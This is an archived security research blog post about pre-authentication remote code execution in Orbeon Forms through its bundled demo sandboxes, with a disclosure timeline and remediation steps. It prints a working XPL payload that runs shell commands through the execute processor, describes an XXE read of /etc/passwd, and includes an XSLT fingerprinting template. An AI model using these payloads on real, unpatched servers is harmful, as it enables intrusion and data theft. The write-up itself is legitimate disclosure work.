---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-09-08_orbeon-forms-the-final-form-on-a-journey-to-rce.md
original_filename: 2023-09-08_orbeon-forms-the-final-form-on-a-journey-to-rce.md
title: 'Orbeon Forms: The Final Form? On A Journey To RCE'
category: documents
detected_topics:
- command-injection
- supply-chain
- sso
- automation-abuse
- information-disclosure
- api-security
tags:
- imported
- documents
- command-injection
- supply-chain
- sso
- automation-abuse
- information-disclosure
- api-security
language: en
raw_sha256: 91cc510067774c334358b887e766e3269001fcd06cfdc633d323a7e131335e92
text_sha256: 301ea3cd083d775ddabad0d3df825559716de31f898abd721f739df479a6c992
ingested_at: '2026-06-28T07:32:25Z'
sensitivity: unknown
redactions_applied: false
---

# Orbeon Forms: The Final Form? On A Journey To RCE

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-09-08_orbeon-forms-the-final-form-on-a-journey-to-rce.md
- Source Type: markdown
- Detected Topics: command-injection, supply-chain, sso, automation-abuse, information-disclosure, api-security
- Ingested At: 2026-06-28T07:32:25Z
- Redactions Applied: False
- Raw SHA256: `91cc510067774c334358b887e766e3269001fcd06cfdc633d323a7e131335e92`
- Text SHA256: `301ea3cd083d775ddabad0d3df825559716de31f898abd721f739df479a6c992`


## Content

---
title: "Orbeon Forms: The Final Form? On A Journey To RCE"
url: "https://labs.watchtowr.com/orbeon-forms-the-final-form/"
final_url: "https://labs.watchtowr.com/orbeon-forms-the-final-form/"
authors: ["watchTowr (@watchtowrcyber)"]
programs: ["Orbeon"]
bugs: ["RCE", "XSLT", "XXE", "XPATH"]
publication_date: "2023-09-08"
added_date: "2023-09-19"
source: "pentester.land/writeups.json"
original_index: 797
---

By — [Sonny](/author/sonny/) — Sep 8, 2023

# Orbeon Forms: The Final Form? On A Journey To RCE

![Orbeon Forms: The Final Form? On A Journey To RCE](https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/size/w1200/2023/09/orbeonforms.png)

When software is introduced as the solution used by “Enterprises and Governments”, it is almost rude of us not to engage further and see how terrifying everything becomes.

One of our key missions at [**watchTowr**](https://watchtowr.com/?ref=labs.watchtowr.com) is to review large amounts of data and extract interesting technology that may pose a risk to those unfortunate enough to utilise it.

As part of our **Continuous Automated Red Teaming and Attack Surface Management** technology - the [**watchTowr**](https://www.watchtowr.com/?ref=watchtowr-labs-blog)**Platform** \- we're incredibly proud of our ability to discover nested, exploitable vulnerabilities across huge attack surfaces.

### Innovation Is Beautiful

Recently, at some ungodly hour of the day, the urge to review some of the “unusual” technology we see appeared - and thus, browsing for a ripe research target to quench the creative thirst began. One thing stood out... _Orbeon Forms_.

It is not often that we can say that software companies literally paint a target on themselves, but when you describe yourself as “Web Forms for the Enterprise and the Government” - I mean…

A brief summary of the application, taken from their website: [https://www.orbeon.com](https://www.orbeon.com/?ref=labs.watchtowr.com)

> “Orbeon Forms is your solution to build and deploy web forms on-premises. It handles very large forms with complex validations, as well as extensive collections of forms that are typical of the enterprise or the government”

![](https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/2023/09/orbeon.png)Just beautiful.

Web forms are as old as the Internet itself, with a variety of technologies and frameworks to implement something that was already done in the 90’s. Why not stick with just this magnum opus of a design?

![](https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/2023/09/forms.png)[https://www.ventureharbour.com/the-evolution-of-web-forms/](https://www.ventureharbour.com/the-evolution-of-web-forms/?ref=labs.watchtowr.com)

How did Orbeon manage to convince so many people that the <form> tag and its immense power needed improving?

![](https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/2023/09/finalform.png)

Needless to say - we found the target of our extra energy. Caffeinated, and inspired to break some code - or, at the very least, understand how we as the human race have improved on the ‘web form’ - we begun.

> 💡 For those that want to follow along at home, you can find the installation guide at [https://doc.orbeon.com/xforms/xforms-tutorial/installation](https://doc.orbeon.com/xforms/xforms-tutorial/installation?ref=labs.watchtowr.com) and the source code on Github: [https://github.com/orbeon/orbeon-forms](https://github.com/orbeon/orbeon-forms?ref=labs.watchtowr.com). The version we used was **orbeon-2022.1.202212310353-CE ,** deployed on Ubuntu, using Tomcat 9.

Whether you’re an Internet miscreant, someone a little more professional, or just a general “I want to see the world burn” enthusiast, we share a common dream - ~~to project pure mayhem~~ to find bugs of significant impact which are reachable pre-authentication.

### Where To Begin?

First impressions of Orbeon Forms show us a “beautiful“ symphony of code - containing Java, Scala and XPL in various flavours - ‘Enterprise’ and ‘Community’, over 500 stars on Github and (so revealed by a brief search of the Internet) is proudly present and exposed by many of the well-known brands that we all use and love.

This story begins with a tried and true method, finding out one thing - where does this bundle of code let me touch it?

By going through each of the accessible web routes, we are establishing two things - first of all, what can we access pre-authentication, and secondly, is there any interesting functionality (the type that gives you the sixth-sense of ‘bad code be here’) that can be reached?

As with all Java applications, we can find these routes defined within the `web.xml` file. In this case, the formidable `/orbeon-war/jvm/src/main/webapp/WEB-INF/web.xml`.

Here we can find various filters, but more importantly - servlet paths - denoted within `<servlet-mapping>` tags. Routes can be reached via HTTP requests aligned to the `url-pattern` values, mapping back to the servlet. For example, the application route “`/xforms-renderer`” maps to the `orbeon-renderer-servlet`, as we can see below:
  
  
  <servlet-mapping>
  <servlet-name>orbeon-renderer-servlet</servlet-name>
  <url-pattern>/xforms-renderer</url-pattern>
  </servlet-mapping>
  

This in turn maps to the specific class path that handles the request:
  
  
  <servlet>
  <servlet-name>orbeon-renderer-servlet</servlet-name>
  <servlet-class>org.orbeon.oxf.servlet.OrbeonServlet</servlet-class>
  ...
  

This is very atypical of a Java application, and simple to follow. Sifting through the `web.xml` file and extracting each route available provides us with the following list:
  
  
  /exist/*
  /exist/rest/*
  /exist/xmlrpc/*
  /xforms-jsp/*
  /xforms-renderer
  /fr/auth
  /fr/service/*
  /fr/style/*
  /fr/not-found
  /fr/error
  /fr/login
  /fr/login-error
  

For many Java applications, this would be all we need to do to enumerate application routes. However, Orbeon Forms actually exposes a much more interesting attack surface than it first appears (who would’ve guessed?). We can very rapidly spot that Orbeon Forms not only exposes routes via the usual `web.xml` file, but also within Scala code and its custom `xpl`file structure.

We can find additional application defined routes to the`.xpl` files by examining the`page-flow.xml` file. For example, the file `/xforms/jvm/src/main/resources/ops/xforms/xforms-renderer-page-flow.xml`:
  
  
  <controller xmlns="<http://www.orbeon.com/oxf/controller>" matcher="regexp">
  
  <files path="(?!/([^/]+)/service/).+\\.(gif|css|pdf|json|js|png|jpg|xsd|htc|ico|swf|html|htm|txt)"/>
  
  <page path="/xforms-renderer" model="xforms-renderer.xpl"/>
  

We can see that all requests that are sent to the path `/xforms-renderer` are handled by the `xforms-renderer.xpl` definition.

### So What Is An XPL File?

If - like ourselves a few days ago - you have never seen the syntax, or even an `xpl` file, fear not - we’re going to demystify it and add more potentially superfluous information to your memory.

What we’ll be looking at is a document written in the “[XML Pipeline Definition Language](https://www.w3.org/TR/xml-pipeline/?ref=labs.watchtowr.com)”.

In short, a document written in this language can be used to define how processing and transformation of an XML document can take place. Documents usually define a ‘`processor`’ via the namespace at the top of the file (similar to XML documents themselves). Variables can then be set, with inputs and outputs, as well as ‘configurations’ which are acknowledged and parsed by the processor.

We’ll go ahead and quickly analyse an example of an endpoint explored later on in this post, just so we can get our heads around what may be going on. Firstly, here are the namespace declarations:
  
  
  <p:config xmlns:p="<http://www.orbeon.com/oxf/pipeline>"
  xmlns:xsl="<http://www.w3.org/1999/XSL/Transform>"
  xmlns:oxf="<http://www.orbeon.com/oxf/processors>">
  

There are three namespaces here. They are named according to the attribute, as `p`, `xsl`, and `oxf` respectively. For example, should anything follow with a tag starting with `<p:>`, the backend processor will interpret it as part of the first definition, `http://www.orbeon.com/oxf/pipeline`.

Here’s an example, which does exactly that:
  
  
  <p:param name="data" type="input"/>
  <p:param name="data" type="output"/>
  

Here we can see the definition of the data parameter with both its input and output declared and attached to the `http://www.orbeon.com/oxf/pipeline` processor.

Reading a bit further:
  
  
  <p:for-each href="#data" select="/company/department" ref="data" root="company">
  <p:processor name="oxf:xslt">
  <p:input name="data" href="current()"/>
  <p:input name="config">
  <department name="{/department/@name}" 
  total-salaries="{sum(/department/employee/@salary)}"
  xsl:version="2.0"/>
  </p:input>
  <p:output name="data" ref="data"/>
  </p:processor>
  </p:for-each>
  

The data from an input variable, named `data`, is parsed into the processor which is of the `oxf:xslt` type. The specific values of `/company/data` from an XML document are pushed through an XPath `sum()` function, and then this is ultimately iterated over using the `for-each` declaration for all nodes in an XML document.

### Now What?

Back to the task at hand - routes, routes, routes!

Browsing through `/orbeon-war/jvm/src/main/webapp/WEB-INF/resources/apps/home/page-flow.xml`, an interesting XPL route immediately stands out:
  
  
  <controller xmlns="<http://www.orbeon.com/oxf/controller>" matcher="regexp">
  
  <page path="/home/xforms" model="examples-xforms.xml" view="view.xpl"/>
  
  <epilogue url="oxf:/config/epilogue.xpl"/>
  </controller>
  

Why does this page have a `model`of`examples-xforms.xml`? Recent history, not-so-recent history - effectively, consistently throughout history - shows that example code is a disaster. Is that what we’re looking at here?

![](https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/2023/09/examples.png)

Surprise surprise, we have access to what appears to be shiny demo applications bundled in the default build to demonstrate the true power of XForms (input fields, submit buttons, dropdown option boxes, select buttons!!!), showcased in a variety of adequately named demo sections.

With a cursorary glance over the descriptions provided, we can see that ”XForms Sandbox” references upload functionality and “XPath” allows… XPath expressions!

### Building Castles In The Sandbox

First up, the XPath sandbox. We can see this is located at `/orbeon/sandbox-transformations/xpath/`. The page prompts us for two inputs - an XML Document, and an XPath query that selects from the supplied document.

Even without diving into the code, experience, logic, common sense tells us that there are fairly common bug classes that this likely is ‘open to’ - namely XXE.

Performed in a standard manner - we can load the contents of `/etc/passwd` into the contents of the returned XML blob via an External XML `Entity`, and then using the XPath query to select the root node from the XML document.

![](https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/2023/09/xpath.png)

We’d say this is definitely an interesting improvement on the historically boring HTML forms we see - innovation is brilliant.

Our demo environment is running on Tomcat, where a local file read is typically devastating - should the Tomcat server have users configured, we can simply read their credentials from the `tomcat-users.xml` file. From there, compromise is trivial, and beyond the scope of what we feel the need to discuss here.

We’re not stargazers, we’re not astrologers - we don’t believe in waiting for stars to align, and the above situation won’t always exist. Let’s continue ~~on our projected path to mayhem~~.

### Where There’s Smoke, There’s Mayhem

Just as an unrelated, almost irrelevant reminder - Orbeon Form’s proudly stated client base is ‘Enterprises’ and ‘Governments’.

It’s time to dive further down the rabbit hole, and into more code.

We can see, by looking at the route declaration in the previously discussed `page-flow.xml` file for this particular endpoint (`/src/main/webapp/WEB-INF/resources/apps/sandbox-transformations/page-flow.xml`), there is no explicit mention of the`/xpath/` route that we played with above, but is infact matched by a regex pattern after `/sandbox-transofrmations/`:
  
  
  <controller xmlns="<http://www.orbeon.com/oxf/controller>" matcher="regexp">
  
  <page path="/sandbox-transformations/([^/]+)/"
  default-submission="parameters.xml" view="view.xhtml">
  <setvalue ref="/*/name" matcher-group="1"/>
  </page>
  
  <page path="/sandbox-transformations/([^/]+)/run" view="${1}/run.xpl"/>
  <page path="/sandbox-transformations/([^/]+)/input" view="${1}/input.xml"/>
  <page path="/sandbox-transformations/([^/]+)/transformation" view="${1}/transformation.xml"/>
  
  <epilogue url="oxf:/config/epilogue.xpl"/>
  
  </controller>
  

A quick grep through the code reveals there to be further hidden application routes that can be accessed through this regex pattern:
  
  
  /xpath/
  /xslt/
  /schema/
  /xpl/
  

Remote Code Execution through the transformation of an XSLT file is [well-trodden ground](https://www.agarri.fr/blog/archives/2013/11/27/compromising_an_unreachable_solr_server_with_cve-2013-6397/index.html?ref=labs.watchtowr.com) \- thus, the /xslt/ endpoint drew attention.

This page requests similar input to the `/xpath` route we saw previously, in that we’re presented with an XML-style input, however now it’s followed by an XSLT definition which is then applied to transform the provided XML document.

If you’re not experienced exploiting XSLT’s, one of the first motions you can go through is to determine the backend library being used. Different libraries come with their own inherent vulnerabilities (CVEs) as well as different functionality that may be abused.

This template allows us to enumerate what the application is using:
  
  
  <?xml version="1.0" encoding="ISO-8859-1"?>
  <xsl:stylesheet version="1.0" xmlns:xsl="<http://www.w3.org/1999/XSL/Transform>">
  <xsl:template match="/">
  Version: <xsl:value-of select="system-property('xsl:version')" /><br />
  Vendor: <xsl:value-of select="system-property('xsl:vendor')" /><br />
  Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" /><br />
  <xsl:if test="system-property('xsl:product-name')">
  Product Name: <xsl:value-of select="system-property('xsl:product-name')" /><br />
  </xsl:if>
  <xsl:if test="system-property('xsl:product-version')">
  Product Version: <xsl:value-of select="system-property('xsl:product-version')" /><br />
  </xsl:if>
  <xsl:if test="system-property('xsl:is-schema-aware')">
  Is Schema Aware ?: <xsl:value-of select="system-property('xsl:is-schema-aware')" /><br />
  </xsl:if>
  <xsl:if test="system-property('xsl:supports-serialization')">
  Supports Serialization: <xsl:value-of select="system-property('xsl:supportsserialization')"
  /><br />
  </xsl:if>
  <xsl:if test="system-property('xsl:supports-backwards-compatibility')">
  Supports Backwards Compatibility: <xsl:value-of select="system-property('xsl:supportsbackwards-compatibility')"
  /><br />
  </xsl:if>
  </xsl:template>
  </xsl:stylesheet>
  

![](https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/2023/09/xslt.png)

It was not possible to escalate to RCE using the techniques mentioned in Agarri’s article linked above, or for us to write to a file using the `result-file` function. Reviewing application error logs suggested this functionality has been explicitly disabled:

![](https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/2023/09/disabled.png)

Shielded from any feelings of defeat, but knowing that shells on .gov are within reach, the `/xpl/` route was dived into and initially appeared to be quite promising.

![](https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/2023/09/xpl.png)

After initially reviewing the sample code provided, we understood as to why the prior XSLT activities were proving unsuccessful - our problems were likely coming from the processor with type `ox:xslt`. Thus, naturally - we dived into the definition of that processor to figure out why.

Processors are defined within the file `/src/main/resources/processors.xml.` Examining this file we can see the processor tagged by name, with some kind of `instantiation` referring to a class it references:
  
  
  <processor name="oxf:xslt">
  <instantiation name="oxf:builtin-saxon"/>
  </processor>
  

We also see a different processor named `oxf:unsafe-xslt`, which appears to disable a whole host of security-sensitive functions (like `result-file` that we tried to use before).

In totality - we have no less than 130 processors to choose from.

A quick search for the keywords that would provide quick wins, quickly provides a promising candidate:
  
  
  <processor name="oxf:execute-processor">
  <class name="org.orbeon.oxf.processor.execute.ExecuteProcessor"/>
  </processor>
  

A brief, famously cursory look at the referenced class, `org.orbeon.oxf.processor.execute.ExecuteProcessor`, shows references to the `org.apache.tools.ant.taskdefs.ExecTask` class, and some handling of its output via `outputStdout` and `outputStderr` methods.

Sounds like another fantastic improvement on the HTML <form> tag.

![](https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/2023/09/htmlform.png)

This is clearly the ‘diamond in the rough’ processor that we were looking for. To check that the custom processor is callable, we quickly inject the following processor declaration into the `/xpl` form and set a breakpoint in my debugger:
  
  
  <p:processor name="oxf:execute-processor">
  </p:processor>
  

What a stroke of luck - the breakpoint triggers, indicating that our processor is being parsed!

![](https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/2023/09/breakpoint.png)

The next step is to figure out how to call the processor with valid inputs.

As luck would strike, we found an example file located in the source repo which demonstrates the use of the `ExecuteProcessor` at `/src/examples-cli/execute/execute-command.xpl`, and adapted it for my nefarious needs, changing the target binary to the usual `/bin/sh`, supplying some arguments, and transforming the output using a different processor to match an expected XML format:

![](https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/2023/09/rce.png)

Well, we get it now. HTML <forms> really did need innovation. We have pre-auth RCE, and well - a clear understanding of who might be vulnerable.

Payload in it’s final form (ha ha, get it?):
  
  
  <!-- Defines the Namespaces Required -->
  <p:config xmlns:p="<http://www.orbeon.com/oxf/pipeline>"
  xmlns:xsl="<http://www.w3.org/1999/XSL/Transform>"
  xmlns:oxf="<http://www.orbeon.com/oxf/processors>">
  
  <!-- Defines the RCE Processor -->
  <p:param name="data" type="output"/>
  <p:processor name="oxf:execute-processor">
  <p:input name="config">
  <exec executable="/bin/sh" dir="/tmp/">
  <arg line="-c 'uname -a' "/>
  </exec>
  </p:input>
  <p:output name="stdout" id="stdout"/>
  </p:processor>
  
  <!-- Convert result and serialize to XML -->
  <p:processor name="oxf:xml-converter">
  <p:input name="config">
  <config>
  <encoding>UTF-8</encoding>
  <indent>true</indent>
  <indent-amount>4</indent-amount>
  </config>
  </p:input>
  <p:input name="data" href="#stdout"/>
  <p:output name="data" ref="data"/>
  </p:processor>
  
  </p:config>
  

![](https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/2023/09/poc.png)

### It’s A Feature, Not A Bug

After some time and reflection into both exploring this opportunity and writing this blog post, we looked at ourselves in the mirror. Demo code? Is this realistic? Did we gain or lose Internet points? 

We arrived at the conclusion that we had gained Internet points. When initially installing Orbeon Forms, there are no obvious warnings or blockers to prevent introducing this vulnerable code into my “production” environments. A quick Google search to confirm if our level of intelligence reflected the “average user”, rapidly confirmed that - yes, we are not alone.

It would be wrong to not point out that looking through the documentation for Orbeon Forms, we can find [here](https://doc.orbeon.com/configuration/advanced/production-war?ref=labs.watchtowr.com#what-can-be-removed) a list of items that “ _can_ ” be removed from a production WAR file. This includes several demo JSP files as well as the interesting Demo Applications exploited above.

![](https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/2023/09/production.png)

The truth is, In the hustle of software development where sprints are fast, deployments agile and environments complex, it is tough to keep track of every detail and possible security vulnerability for our code building friends. It's even harder when holes are built into a product you’re not square-inch familiar with and the recommendation to remove doesn’t come with loud .wav’s , <marquee> or pop-up boxes - or, an obnoxious <form>.

Having to directly edit and build your own WAR file to remove unknown vulnerabilities (based on our cursory (we love this word) search) shows that even the well-oiled, well-funded engineering teams also missed this memo.

`<marqueee> * Please bring back marquee tags !* </marquee>`

> 💡 A brief history lesson for my friends still reading this far down, If we take some examples that include dangerous functionality when pushed to production, you can get a feel for what i’m alluding to.

> We owe a great [Thankyou to artsploit](https://www.veracode.com/blog/research/exploiting-spring-boot-actuators?ref=labs.watchtowr.com) for teaching us the way of Springboot Actuators, a bundled developer suite of diagnostic and debug endpoints which “can” be enabled without authentication. One such critical example of this is the [/trace endpoint](https://www.baeldung.com/spring-boot-actuator-http?ref=labs.watchtowr.com) which returns to us a nicely JSON formatted output of all HTTP request logs, including headers (yum, cookies).

> Laravel’s Ignition has had its problems with its debug functionality, that when enabled allowed for the introduction to a PHAR deserialization vulnerability. - [https://hackmag.com/coding/laravel-ignition-rce/](https://hackmag.com/coding/laravel-ignition-rce/?ref=labs.watchtowr.com)

> [Birt Report Viewer](https://bugs.eclipse.org/bugs/show_bug.cgi?id=538142&ref=labs.watchtowr.com) \- An Open-source report generation Tool used by large enterprises, this tool came bundled with its own ‘Example’ directory and ‘Sample’ template with controllable parameters. As the example could be triggered into generating a report with its own custom filename, a .JSP “ _report_ ” could be created and sample data injected, allowing for Remote Code Execution.

> In short, as hackers we’re no strangers to seeing unintended functionality being introduced to targets exposed to the Internet, simple documentation isn’t adequate enough to prevent this.

We reached out to the developers at Orbeon who have agreed that shipping the example code by default, bundled inside their production war files, does open up users to potential _bad things._

  * [https://github.com/orbeon/orbeon-forms/issues/5944](https://github.com/orbeon/orbeon-forms/issues/5944?ref=labs.watchtowr.com)
  * [https://github.com/orbeon/orbeon-forms/issues/5943](https://github.com/orbeon/orbeon-forms/issues/5943?ref=labs.watchtowr.com)

They did provide us with this - “ _The whole purpose of the sandboxes is to allow remote code execution :)_ ”. Like we said, we have a lot of respect for innovation.

Remediation is documented, and provided by Orbeon as follows:

  * Ensure the following Production WAR settings are implemented: [https://doc.orbeon.com/configuration/advanced/production-war#what-can-be-removed](https://doc.orbeon.com/configuration/advanced/production-war?ref=labs.watchtowr.com#what-can-be-removed)
  * Orbeon’s team has removed the examples being shipped by default in their 2023.1 build.

Our personal recommendation is to verify in your current setup that the example applications are not accessible, just visit your page: httpx://host/orbeon/home/xforms to see 🙂

Orbeon have been a pleasure to communicate and work with, and they’re correct in what we have stumbled upon is a feature and not a bug.

Unfortunately, the security world does not operate based on intention. What Orbeon haven’t accounted for is that relying on anyone to **fully** read **any** documentation, let alone to disable this feature (despite no glaring security warnings), inadvertently opens up their customers to exploitation.

Let's not forget the purpose of this application is to create forms for users to submit their data - data which is likely to be highly sensitive. 

[They weren’t kidding when they said enterprises and governments use this software.](https://www.orbeon.com/customers?ref=labs.watchtowr.com)

Timeline

Date | Detail  
---|---  
1st August 2023 | Vulnerability discovered  
1st August 2023 | Requested security contact for Orbeon  
2nd August 2023 | Received security contact, disclosed to Orbeon  
2nd August 2023 | watchTowr hunts through client's attack surfaces for impacted systems, communicates with those affected.  
29th August 2023 | The Orbeon development team acknowledges validity of report, and releases fix in version 2023.1  
8th September 2023 | Blogpost and PoC released to public The research published by [watchTowr Labs](https://watchtowr.com/) is powered by the same engine behind the [watchTowr Platform](https://watchtowr.com/), our **Preemptive Exposure Management** solution built for enterprises that refuse to wait for the next satisfying advisory from their scanner vendor. The [watchTowr Platform](https://watchtowr.com/) combines **External Attack Surface Management** and **Continuous Automated Red Teaming** to test your defenses against the vulnerabilities and techniques that matter: the ones real attackers are actually exploiting.

### Gain early access to our research, and understand your exposure, with the watchTowr Platform

[REQUEST A DEMO](https://watchtowr.com/demo/)
